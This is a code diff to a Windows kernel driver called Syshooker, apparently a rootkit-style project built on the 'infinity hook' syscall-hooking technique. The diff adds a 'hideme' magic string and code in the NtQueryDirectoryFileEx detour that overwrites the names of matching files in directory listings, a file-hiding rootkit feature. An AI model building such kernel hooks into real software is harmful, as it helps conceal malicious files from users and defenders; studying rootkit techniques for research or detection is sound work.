@@ -36,7 +36,7 @@ UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
-SyshookerSettings Settings = {L"ifh--", L"wassup"};
+SyshookerSettings Settings = {L"ifh--", L"wassup", L"hideme"};
 
 /*
 *	The entry point of the driver. Initializes infinity hook and
@@ -369,6 +369,14 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 				FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 			}
 			kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
+			if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
+				
+				// change its name to be xxx
+				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+					(FileInformationPtr->FileName)[i] = L'x';
+				}
+			}
 
 			if (FileInformationPtr->NextEntryOffset == 0) break;
 			else {
